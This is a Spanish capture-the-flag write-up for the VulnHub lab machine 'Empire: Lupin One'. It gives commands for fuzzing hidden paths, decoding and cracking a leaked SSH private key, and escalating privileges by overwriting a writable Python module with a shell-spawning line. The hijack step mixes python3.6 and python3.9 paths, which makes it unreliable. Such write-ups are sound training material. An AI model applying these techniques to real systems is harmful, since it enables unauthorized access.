---
title: "Empire: Lupin One - VulnHub"
date: 2024-07-18
description: "Fuzzing de prefijos inusuales, clave SSH en base58 y Python library hijacking."
excerpt: "robots.txt → fuzzing de rutas ~/. → clave SSH en base58 → crack de passphrase → sudo python con módulo escribible → arsene."
platform: "VulnHub"
difficulty: "Medium"
image: "/images/vulnhub.svg"
tags:
  - "Fuzzing"
  - "base58"
  - "SSH Key"
  - "Python Hijacking"
  - "Linux"
---

Empire: Lupin One premia la curiosidad: la ruta correcta empieza con un carácter que las wordlists estándar nunca prueban.

**Servicios:** `22` SSH · `80` Apache

## 1. Fuzzing dirigido de prefijos

`robots.txt` apunta a `/~myfiles`. Como el prefijo `~` no está en las wordlists habituales, hacemos un **fuzzing dirigido** de ese patrón y de archivos ocultos:

```bash
ffuf -w common.txt:FUZZ -u 'http://target/~FUZZ'                 # → ~secret
ffuf -w list.txt:FUZZ  -u 'http://target/~secret/.FUZZ' -e .txt  # → .mysecret.txt
```

## 2. Clave SSH en base58

`.mysecret.txt` contiene una clave SSH privada codificada en **base58**. La decodificamos y crackeamos la passphrase:

```bash
ssh2john emp_rsa > emp.john
john emp.john -w=fasttrack.txt   # passphrase: P@55w0rd!
ssh -i emp_rsa icex64@target
```

## 3. Escalada — Python library hijacking

`sudo -l` muestra que `icex64` puede ejecutar `python3.9 /home/arsene/heist.py` como **arsene**. El script importa `webbrowser`, y ese módulo es **escribible**:

```bash
echo 'import os; os.system("/bin/bash")' > /usr/lib/python3.6/webbrowser.py
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py   # → arsene
```

## Conceptos aplicados

- Fuzzing de prefijos inusuales (`~`, `.`).
- Clave SSH en **base58** + crack de passphrase.
- **Python library hijacking** (módulo importado con permisos de escritura).
